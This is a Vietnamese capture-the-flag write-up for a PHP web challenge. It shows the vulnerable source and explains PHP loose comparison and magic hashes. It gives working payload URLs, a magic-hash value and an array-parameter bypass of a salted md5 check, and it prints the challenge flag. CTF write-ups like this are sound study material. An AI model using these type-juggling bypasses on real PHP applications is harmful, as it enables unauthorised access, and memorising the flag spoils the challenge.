# Piece Of Cake
> IP: http://103.245.249.76:49155


```php
<?php 
include "flag.php"; 
highlight_file(__FILE__); 
error_reporting(0); 
$str1 = $_GET['0']; 

if(isset($_GET['0'])){ 
    if($str1 == md5($str1)){ 
        echo $onion1; 
    } 
    else{ 
        die(); 
    } 
} 
else{ 
    die();    
} 

$str2 = $_GET['1']; 
$str3 = $_GET['2']; 

if(isset($_GET['1']) && isset($_GET['2'])){ 
    if($str2 !== $str3){ 
        if(hash('md5', $salt . $str2) == hash('md5', $salt . $str3)){ 
            echo $onion2; 
        } 
        else{ 
            die(); 
        } 
    } 
    else{ 
        die(); 
    } 
} 
else{ 
    die();    
} 
?> 
```

### Strategy
- Đây cũng là một bài về PHP và tiếp tục khai thác [PHP Loose Comparsion](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf) và [Magic hashes – PHP hash "collisions"](https://github.com/spaze/hashes).
- Bài cho 3 GET Parameter là `0`,`1`,`2`. 

- Với `$_GET[`0`]` thì khi so sánh `==`, hash md5 so sánh với chính nó, mình tìm được `0e215962017` và `0e291242476940776845150308577824`. Bạn có thể tham khảo thêm ở [đây](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md?fbclid=IwAR3a3sJnizCJZnrNVEqkcC-lVBeKdkIVZBmFkL7VWJ_MYdDKy6Rd715cdJs).

```htm1
<?php 
include "flag.php"; 
highlight_file(__FILE__); 
error_reporting(0); 
$str1 = $_GET['0']; 

if(isset($_GET['0'])){ 
    if($str1 == md5($str1)){ 
        echo $onion1; 
    } 
    else{ 
        die(); 
    } 
} 
else{ 
    die();    
} 
```
=> Mình có payload đầu tiên và tìm ra được phần đầu của flag `FPTUHACKING{StR1Ngs_`
`http://103.245.249.76:49155/?0=0e1137126905`

![image](https://user-images.githubusercontent.com/93731698/175820279-6ddefd10-83ba-405d-a35e-72732ec86ded.png)

- Tiếp theo, chúng ta có `$_GET['1']` và `$_GET['2']`.

```htm1
$str2 = $_GET['1']; 
$str3 = $_GET['2']; 

if(isset($_GET['1']) && isset($_GET['2'])){ 
    if($str2 !== $str3){ 
        if(hash('md5', $salt . $str2) == hash('md5', $salt . $str3)){ 
            echo $onion2; 
        } 
        else{ 
            die(); 
        } 
    } 
    else{ 
        die(); 
    } 
} 
else{ 
    die();    
```

- Mình thấy có 1 biến `$slat` concat trước các biến `$str2`, `$Str3` và đọc dòng lệnh `if(hash('md5', $salt . $str2) == hash('md5', $salt . $str3))`, mình đã nghĩ ngay thử gán Parameter `1` = mã hash nào đó, Parameter `2` = mã hash nào đó vì dây là loose compare trong PHP như ở trên mình nói khi so sánh `==`. Nhưng mình đã thử 1 cách khác mình, 1 cho Parameter `1` vào 1 mảng và gán với 1 giá trị random (`1[]=`), Parameter `2` tương tự => Bypass và ra phần còn lại của flag. 
- Payload: `http://103.245.249.76:49155/?0=0e1137126905&1[]=2222&2[]=adasdsa`

### $Flag:

![image](https://user-images.githubusercontent.com/93731698/175820756-96a99dcf-41c1-4483-8bb7-4c261b38f12f.png)

Flag: `FPTUHACKING{StR1Ngs_c0nCaTeNaT1oN_1s_EaSy_!!!}`

# References: 
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md?fbclid=IwAR3a3sJnizCJZnrNVEqkcC-lVBeKdkIVZBmFkL7VWJ_MYdDKy6Rd715cdJs, here will explain clearly `PHP Juggling type and magic hashes`.




